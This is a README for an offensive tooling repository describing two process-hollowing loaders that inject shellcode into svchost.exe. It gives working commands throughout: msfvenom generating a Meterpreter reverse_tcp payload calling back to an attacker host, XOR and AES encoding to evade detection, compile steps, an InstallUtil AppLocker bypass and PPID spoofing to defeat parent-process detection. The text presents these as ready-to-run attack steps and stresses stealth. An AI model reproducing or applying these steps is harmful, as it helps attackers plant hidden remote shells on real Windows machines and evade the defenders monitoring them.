# process-hollowing

Two files. Both **standalone** — pick one. Process hollowing creates a legitimate Windows process (`svchost.exe`) in a suspended state, overwrites its code with shellcode, then resumes it. From Task Manager, the process looks 100% legitimate.

**Why hollowing?**
- Process appears as `svchost.exe` with a real Windows binary path
- Process was created normally by the OS
- Only the in-memory code has been changed — disk file is untouched

---

## File Roles

| File | Standalone? | When to use | AppLocker bypass? |
|------|-------------|-------------|-------------------|
| `hollow.cs` | Yes | No AppLocker restrictions | No |
| `clhollow.cs` | Yes | AppLocker present, want PPID spoof | Yes (InstallUtil) |

---

## Hollowing Technique (both files)

```
CreateProcess(svchost.exe, SUSPENDED)
  → Read PEB → find base address
  → Parse PE header → find AddressOfEntryPoint
  → WriteProcessMemory(shellcode → entrypoint)
  → ResumeThread()
```

The hardest part is finding the entrypoint dynamically (ASLR means svchost loads at a different address every time):
- `PEB.ImageBaseAddress` → where svchost loaded in memory
- PE header at `base + 0x3C` (e_lfanew) → Optional Header
- `AddressOfEntryPoint` (RVA) at offset `0x28` in Optional Header
- Actual entrypoint = `base + RVA`

---

## hollow.cs — Basic Version

XOR-encoded shellcode (key `0xfa`). Hollows `svchost.exe`.

```bash
# 1. Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin

# 2. XOR encode
python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa --format csharp

# 3. Paste into buf[] in hollow.cs

# 4. Compile — Visual Studio (Windows dev box)
#
#    File → New → Project → Console App (.NET Framework)
#    Name: "hollow", Framework: .NET Framework 4.8
#    Paste hollow.cs contents, replace defaults
#    Project → Properties → Build:
#      Platform target: x64
#      ☑ Allow unsafe code
#    Build → Build Solution (Ctrl+Shift+B)
#    Output: bin\x64\Debug\hollow.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:hollow.exe hollow.cs

# 5. Run
.\hollow.exe
```

---

## clhollow.cs — AppLocker Bypass + PPID Spoof

AES-encrypted shellcode. Uses InstallUtil AppLocker bypass. Also spoofs the PPID (parent process ID) of the spawned `svchost.exe` so it appears as a child of `explorer.exe` or another legitimate process, defeating parent-chain-based detection.

```bash
# 1. Generate with placeholder IP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=11.11.11.11 LPORT=4444 EXITFUNC=thread -f raw -o shell.bin

# 2. AES encrypt
python3 04-encoders/aes/shellcode_encoder.py shell.bin <PASSWORD> aes

# 3. Paste into buf[], set PASSWORD and real LHOST/LPORT constants

# 4. Compile — Visual Studio (Windows dev box)
#
#    File → New → Project → Console App (.NET Framework)
#    Name: "clhollow", Framework: .NET Framework 4.8
#    Paste clhollow.cs contents, replace defaults
#    Project → Properties → Build:
#      Platform target: x64
#      ☑ Allow unsafe code
#    Build → Build Solution (Ctrl+Shift+B)
#    Output: bin\x64\Debug\clhollow.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:clhollow.exe clhollow.cs

# 5. Run via InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U clhollow.exe
```

---

## Which to choose?

- **No AppLocker** → `hollow.cs`
- **AppLocker present** → `clhollow.cs`
- **Want injection into an existing process instead of creating one** → see `process-injection/`
- **Want even less suspicious memory ops** → see `sections-injection/`
